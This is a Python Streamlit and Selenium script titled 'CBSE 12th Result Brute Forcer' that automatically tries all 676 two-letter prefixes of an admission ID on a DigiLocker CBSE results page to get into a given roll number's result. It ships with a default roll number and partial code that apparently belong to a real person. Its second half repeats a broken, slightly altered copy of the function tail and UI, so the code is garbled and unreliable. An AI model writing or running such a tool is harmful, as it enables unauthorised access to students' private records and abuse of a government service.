import streamlit as st
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import time
import string

# ====================== HELPER FUNCTIONS ======================
def get_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    return webdriver.Chrome(options=options)

def is_success(driver):
    """Success = No visible error message in #err_msg"""
    try:
        error_elem = driver.find_element(By.ID, "err_msg")
        if error_elem.is_displayed() and error_elem.text.strip():
            return False  # Error message is visible → failed
        return True       # No error message → success
    except NoSuchElementException:
        return True       # Error element not found → likely success
    except:
        return False


def run_brute_force(roll_number, known_last_6, delay):
    status = st.empty()
    progress = st.empty()
    result = st.empty()

    driver = None
    try:
        driver = get_driver()
        driver.get("https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html")
        status.success("✅ Browser started. Starting brute force...")

        letters = string.ascii_uppercase
        count = 0

        for a in letters:
            for b in letters:
                code = f"{a}{b}{known_last_6}"
                count += 1
                progress.info(f"**Progress:** {count}/676 | Trying: **{a}{b}** → `{code}`")

                try:
                    # Fill fields
                    driver.find_element(By.ID, "rroll").clear()
                    driver.find_element(By.ID, "rroll").send_keys(roll_number)

                    driver.find_element(By.ID, "admn_id").clear()
                    driver.find_element(By.ID, "admn_id").send_keys(code)

                    driver.find_element(By.ID, "submit").click()
                    
                    time.sleep(delay)

                    if is_success(driver):
                        result.success(f"""
                        🎉 **SUCCESS FOUND!**

                        **Full Code:** `{code}`
                        **Prefix:** `{a}{b}`
                        """)
                        st.balloons()
                        return
                except:
                    continue

        st.error("❌ Finished all 676 attempts. Code not found.")

    except Exception as e:
        st.error(f"Error: {str(e)}")
    finally:
        if driver:
            driver.quit()


# ====================== UI ======================
st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
st.title("🔍 CBSE 12th Result Brute Forcer")

roll_number = st.text_input("Roll Number", value="18615900")
known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
delay = st.slider("Delay between attempts (seconds)", 1.0, 6.0, 3.0, 0.5)

if st.button("🚀 Start Brute Force", type="primary"):
    if len(known_last_6) != 6:
        st.error("Last 6 characters must be exactly 6.")
    elif not roll_number:
        st.error("Please enter Roll Number.")
    else:
        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)                        🎉 **SUCCESS FOUND!**

                        **Full Code:** `{code}`
                        **Prefix:** `{a}{b}`
                        """)
                        st.balloons()
                        return
                except:
                    continue

        st.error("❌ Finished all 676 attempts. Code not found.")

    except Exception as e:
        st.error(f"**Browser Error:** {str(e)}")
    finally:
        if driver:
            driver.quit()


# ====================== MAIN UI ======================
st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
st.title("🔍 CBSE 12th Result Brute Forcer")

roll_number = st.text_input("Roll Number", value="18615900")
known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
delay = st.slider("Delay between attempts (seconds)", 1.5, 5.0, 2.5)

if st.button("🚀 Start Brute Force", type="primary"):
    if len(known_last_6) != 6:
        st.error("Last 6 characters must be exactly 6.")
    elif not roll_number:
        st.error("Please enter Roll Number.")
    else:
        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)
